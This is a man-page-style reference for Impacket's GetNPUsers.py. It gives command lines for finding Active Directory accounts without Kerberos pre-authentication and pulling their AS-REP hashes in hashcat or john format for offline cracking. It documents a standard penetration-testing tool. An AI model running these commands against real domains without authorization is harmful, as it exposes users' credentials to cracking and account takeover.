# TLDR

**Query AS-REP roastable** users

```GetNPUsers.py [domain]/[username] -dc-ip [dc_ip]```

**No preauth enumeration**

```GetNPUsers.py [domain]/ -usersfile [users.txt] -dc-ip [dc_ip]```

**Request TGT**

```GetNPUsers.py [domain]/[username]:[password] -dc-ip [dc_ip] -request```

**Output hashcat format**

```GetNPUsers.py [domain]/ -usersfile [users.txt] -format hashcat -dc-ip [dc_ip]```

# SYNOPSIS

**GetNPUsers.py** [_domain_]/[_user_] [_options_]

# PARAMETERS

_DOMAIN/USER_
> Domain and username.

**-dc-ip** _IP_
> Domain controller IP.

**-usersfile** _FILE_
> File with usernames.

**-request**
> Request TGT.

**-format** _FORMAT_
> Output format: hashcat, john.

**-outputfile** _FILE_
> Output file.

**--help**
> Display help information.

# DESCRIPTION

**GetNPUsers.py** is an Impacket tool for AS-REP Roasting attacks. It identifies Active Directory users with Kerberos pre-authentication disabled and retrieves their password hashes.

The tool requests AS-REP responses for users without pre-auth, which contain encrypted data crackable offline. It's used in penetration testing for credential attacks.

GetNPUsers.py enables identifying weak configurations in Active Directory.

# CAVEATS

**Authorized testing only.** Requires network access to DC. Results need offline cracking.

# HISTORY

GetNPUsers.py is part of **Impacket**, the Python network protocol toolkit. It implements AS-REP Roasting attacks documented in Active Directory security research.

# SEE ALSO

[GetUserSPNs.py](/man/GetUserSPNs.py)(1), [secretsdump.py](/man/secretsdump.py)(1)
